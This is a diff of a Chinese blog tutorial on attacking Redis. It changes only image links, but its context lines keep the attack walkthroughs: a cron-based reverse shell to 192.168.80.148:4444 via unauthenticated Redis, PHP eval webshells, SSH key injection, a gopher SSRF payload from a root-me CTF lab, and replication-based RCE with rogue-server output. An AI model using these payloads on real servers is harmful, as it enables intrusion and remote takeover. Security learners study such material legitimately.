@@ -485,19 +485,19 @@
 <li>利用ssh写公钥</li>
 </ul>
 <h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><h4 id="利用contrab计划任务反弹shell"><a href="#利用contrab计划任务反弹shell" class="headerlink" title="利用contrab计划任务反弹shell"></a>利用contrab计划任务反弹shell</h4><p>nmap探测一下6379端口有没有开放，可以看到端口开放运行redis</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/giPD3Wkaw91BJxy.png" alt="2.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/nJXSCWRgch6HQt3.png" alt="2.png"></p>
 <p>本地连接一下,命令<code>redis-cli -h ip</code>连接，<code>info</code>查看一些敏感信息</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/1WQYUxpXsGEJNcR.png" alt="1.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/HWslLe2Anbmcp7w.png" alt="1.png"></p>
 <p>先通过contrab计划任务反弹shell试一下</p>
 <pre class=" language-php"><code class="language-php">set xxx <span class="token string">"\n\n*/1 * * * * /bin/bash -i>&amp;/dev/tcp/192.168.80.148/4444 0>&amp;1\n\n"</span>
 config set dir <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool<span class="token operator">/</span>cron
 config set dbfilename root
 save</code></pre>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/eDFvJwqLaCUm3Sz.png" alt="5.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/3UqoYarCiI5d2W8.png" alt="5.png"></p>
 <p>监听一下4444端口</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/So2A9CXgYZFcxQt.png" alt="4.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/tDT2H83Ga1bBOlp.png" alt="4.png"></p>
 <p>稍微等一会，等定时任务执行，就会收到反弹shell</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/61W2qrIvVog5f4u.png" alt="6.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/XB52IRZldzHT9Vq.png" alt="6.png"></p>
 <p>这是在<code>CentOS</code>上面执行的，但是在<code>Ubuntu</code>上行不通，原因如下：</p>
 <ul>
 <li><p>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/</code>权限644也能执行</p>
@@ -513,10 +513,10 @@ set xxx <span class="token string">"\n\n\n&lt;?php @eval($_POST['c']);?>\n\n\n"<
 config set dbfilename webshell<span class="token punctuation">.</span>php
 save</code></pre>
 <p>先通过浏览器看看能不能访问到</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/jGHPDnr6u1KwSmN.png" alt="10.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/wuKPEzAXoZ1O8U7.png" alt="10.png"></p>
 <p>浏览器可以访问到，用蚁剑连接一下试试</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/tpRdNJjfSAevcL2.png" alt="11.png"></p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/MhCckWYyHF6wsEN.png" alt="12.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/UzLKOPuie3sbfav.png" alt="11.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/9EejIl3sFx6Ug8w.png" alt="12.png"></p>
 <h4 id="写SSH公钥"><a href="#写SSH公钥" class="headerlink" title="写SSH公钥"></a>写SSH公钥</h4><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p>
 <p>生成秘钥不在演示</p>
 <p>将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合）,再把key.txt文件内容写入目标主机的缓冲里：</p>
@@ -527,27 +527,27 @@ cat <span class="token operator">/</span>root<span class="token operator">/</spa
 config set dbfilename authorized_keys
 save</code></pre>
 <p>最后使用ssh远程连接</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/nkCmPa5rcTOd6QF.png" alt="8.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/smecJ4RzBHof8CD.png" alt="8.png"></p>
 <p>可以看到不用密码就能登录</p>
 <p>可以看一下authorized_keys的文件内容，里面会有我们写入的公钥和一些缓冲的乱码，这也就是我们为什么要加换行<code>(\n)</code>的原因</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/zuLVxjWwF5k1pGb.png" alt="9.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/1n2qYhKoWbfvpzF.png" alt="9.png"></p>
 <h3 id="通过SSRF利用redis"><a href="#通过SSRF利用redis" class="headerlink" title="通过SSRF利用redis"></a>通过SSRF利用redis</h3><h4 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h4><p>地址：<code>https://www.root-me.org/en/Capture-The-Flag/CTF-all-the-day/</code></p>
 <p>目的：SSRF+redis 获取内网主机权限，利用SSRF来对redis的未授权访问执行命令。从而达到获取主机权限的目的<br>访问目标地址，如果没有账号，需要创建账号点击右上的绿色小加号来创建账号，创建完成后回到此页面。<br>找到一个处于none的虚拟机，点击房间名</p>
 <p><img src="https://i.loli.net/2020/09/17/gcfG3pJsmT1K8Eo.png" alt="19.png"></p>
 <p>然后进入这个房间，选择需要创建的虚拟机，选择SSRF Box，点击保存</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/hWa36wEeANC9bSx.png" alt="20.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/7Vt8y56jJZbXKrg.png" alt="20.png"></p>
 <p>等待一段时间环境就可以访问了</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/TulGJ7WjZ8dHIaU.png" alt="21.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/ZByMRCds2XbcDue.png" alt="21.png"></p>
 <p>之后访问这个虚拟机就可以了，因为我这里是用ctf07创建的，所以进的就是<code>http://ctf07.root-me.org/</code></p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/fWmHg4CXbzAGn8v.png" alt="22.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/Pd6rSOYMVx152km.png" alt="22.png"></p>
 <p>进去之后需要输入一个URL参数，很明显输入一个百度试下</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/bnpRmkSKU64EFw3.png" alt="13.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/Kw9YXcofBRWyV5x.png" alt="13.png"></p>
 <p>我们再来试着读一下系统文件<code>/etc/passwd</code></p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/sdU7ZwjuviNhEqb.png" alt="14.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/zcfmxXQ6vtSNHyl.png" alt="14.png"></p>
 <p>正常来说咱需要爆破一下他的端口号来确定开启那些服务，因为咱原先就知道，这一步就省略了</p>
 <p>当我们访问6378的时候呢，显示的是拒绝连接，这就说明端口并没有开放，访问6379的时候呢端口并不是拒绝连接而是报错了，证明这个端口开放</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/hRYzK25tEw98eOG.png" alt="23.png"></p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/Neknx5JGPs2TjBM.png" alt="24.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/hwAIxcXkrgT2sqR.png" alt="23.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/iSXRwE6qjezyWuK.png" alt="24.png"></p>
 <p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
 <p>因此，此漏洞在没有配置密码的情况下可以利用SSRF来绕过绑定在本地的限制，从而实现在外网攻击内网应用。</p>
 <h4 id="利用redis写webshell"><a href="#利用redis写webshell" class="headerlink" title="利用redis写webshell"></a>利用redis写webshell</h4><p>利用脚本(来自<code>By七友</code>师傅)</p>
@@ -585,10 +585,10 @@ if __name__=="__main__":
 <p>生成payload</p>
 <pre class=" language-php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Aredis.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0</span></code></pre>
 <p>发送payload,可以看到页面回显OK,这就代表写入成功了</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/IMLAg4sayhjlBVf.png" alt="17.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/KdeYAqPJLiWHVuf.png" alt="17.png"></p>
 <p>但是这个地方我用蚁剑并没有连接上，不知道为啥</p>
 <p>在URL中访问试一下，可以访问到并且能够执行<code>phpinfo()</code></p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/VK3UWLsiMfEr84J.png" alt="16.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/sPwJ8eXgD1oaZpn.png" alt="16.png"></p>
 <h2 id="Redis-基于主从复制的-RCE-利用方式"><a href="#Redis-基于主从复制的-RCE-利用方式" class="headerlink" title="Redis 基于主从复制的 RCE 利用方式"></a>Redis 基于主从复制的 RCE 利用方式</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>redis 4.x/5.x RCE是由<code>LC/BC</code>战队队员<code>Pavel Toporkov</code>在<code>zeronights 2018</code>上提出的基于主从复制的redis rce</p>
 <h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。<br>默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点</p>
 <h3 id="建立主从模式的3种方式"><a href="#建立主从模式的3种方式" class="headerlink" title="建立主从模式的3种方式"></a>建立主从模式的3种方式</h3><ul>
@@ -598,10 +598,10 @@ if __name__=="__main__":
 </ul>
 <p><strong>注意：建立主从关系只需要在从节点操作就行了，主节点不用任何操作</strong></p>
 <p>在<code>docker</code>中开启两台<code>redis</code></p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/nNTtaIj8cVq46gE.png" alt="27.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/mwdNpk5yiYotbqM.png" alt="27.png"></p>
 <p>建立主从模式</p>
 <p>查看IP：<code>docker inspect 容器ID</code></p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/F25fX4pNzdTwUnx.png" alt="28.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/5eogjKrYTxszwdh.png" alt="28.png"></p>
 <p>解除主从关系可以执行<code>SLAVEOF NO ONE</code></p>
 <h3 id="redis-module"><a href="#redis-module" class="headerlink" title="redis module"></a>redis module</h3><p>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能。<br>Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。</p>
 <p>恶意so文件编写：<code>https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK</code></p>
@@ -620,7 +620,7 @@ if __name__=="__main__":
 <span class="token constant">SLAVEOF</span> <span class="token constant">NO</span> <span class="token constant">ONE</span>　解除主从关系  </code></pre>
 <p>工具：<code>https://github.com/Dliv3/redis-rogue-server</code></p>
 <p>python3 redis-rogue-server.py –rhost 172.17.0.3 –rport 6379 –lhost 172.17.0.1 –lport 6381</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/ICLDmvbO2pS8utq.png" alt="26.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/x3dqXg9ljm7coPk.png" alt="26.png"></p>
 <pre class=" language-php"><code class="language-php"><span class="token constant">BINDING</span> <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token punctuation">:</span><span class="token number">6381</span>
 <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">-</span><span class="token punctuation">]</span> b<span class="token string">'*3\r\n$7\r\nSLAVEOF\r\n$10\r\n172.17.0.1\r\n$4\r\n6381\r\n'</span>
 <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span> b<span class="token string">'+OK\r\n'</span>
@@ -645,7 +645,7 @@ if __name__=="__main__":
 <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token punctuation">]</span> 
 </code></pre>
 <p>连上去看可不可以执行命令</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/RyfOZ7WFgr6kJI5.png" alt="30.png"></p>
+<p><img src="https://i.loli.net/2021/05/22/ZUOtXoSpnfN2xVr.png" alt="30.png"></p>
 <p>参考：</p>
 <p><code>https://www.freebuf.com/articles/web/227309.html</code></p>
 <p><code>https://xz.aliyun.com/t/5665#toc-6</code></p>
